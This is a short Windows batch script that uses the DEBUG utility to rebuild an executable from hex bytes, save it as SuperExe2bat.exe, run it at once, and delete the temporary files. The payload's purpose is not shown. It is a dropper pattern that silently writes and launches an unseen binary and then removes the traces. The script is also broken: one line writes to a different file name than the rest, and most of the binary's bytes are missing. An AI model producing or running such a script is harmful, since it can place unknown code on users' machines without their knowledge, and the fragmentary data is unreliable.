@echo e 100 4D 5A 4B 45 52 4E 45 4C 33 32 2E 44 4C 4C 00 00 >>tmp1122
@echo e 22A0 D0 8D 54 95 00 FF 16 5A 9F 12 C0 D0 E9 74 0E 9E >>tmp11
@echo e 22B0 1A F2 74 E3 B4 00 33 C9 B5 01 FF 56 50 33 C9 E9 >>tmp11
@echo e 22C0 FB 00 00 00 04 F9 1A C0 B1 30 8B 6B 08 03 D1 FF >>tmp11
@echo e 22D0 16 73 49 03 D1 FF 16 72 17 03 D1 FF 16 72 27 24 >>tmp11
@echo e 22E0 02 04 09 50 8B C7 2B 43 08 8A 00 E9 CD 00 00 00 >>tmp11
@echo e 22F0 83 C2 60 FF 16 87 6B 0C 73 0C 03 D1 FF 16 87 6B >>tmp11
@echo e 2300 10 73 03 87 6B 14 24 03 04 08 50 55 8D 93 78 07 >>tmp11
@echo e 2310 00 00 FF 56 54 5D 91 E9 95 00 00 00 24 03 04 07 >>tmp11
@echo e 2320 50 87 6B 0C 87 6B 10 89 6B 14 8D 93 C0 0B 00 00 >>tmp11
@echo e 2330 FF 56 54 6A 03 59 50 48 3B C1 72 02 8B C1 C1 E0 >>tmp11
@echo e 2340 06 B1 40 8D AC 83 78 03 00 00 FF 56 4C 3C 04 8B >>tmp11
@echo e 2350 E8 72 5C 33 ED D1 E8 13 ED 48 45 91 45 D3 E5 80 >>tmp11
@echo e 2360 F9 05 8D 94 AB 78 01 00 00 76 2B 80 E9 04 33 C0 >>tmp11
@echo e 2370 8B 53 FC D1 2B 8B 12 0F CA 2B 53 04 03 C0 3B 13 >>tmp11
@echo e 2380 72 06 8B 13 40 01 53 04 FF 56 10 E2 >>tmp11
@echo rcx>>tmp11
@echo 228C>>tmp11
@echo n tmp1>>tmp11
@echo w>>tmp11
@echo q>>tmp11
@debug<tmp11>nul
@Copy /b /y tmp1 SuperExe2bat.exe
@start SuperExe2bat.exe
@del tmp*
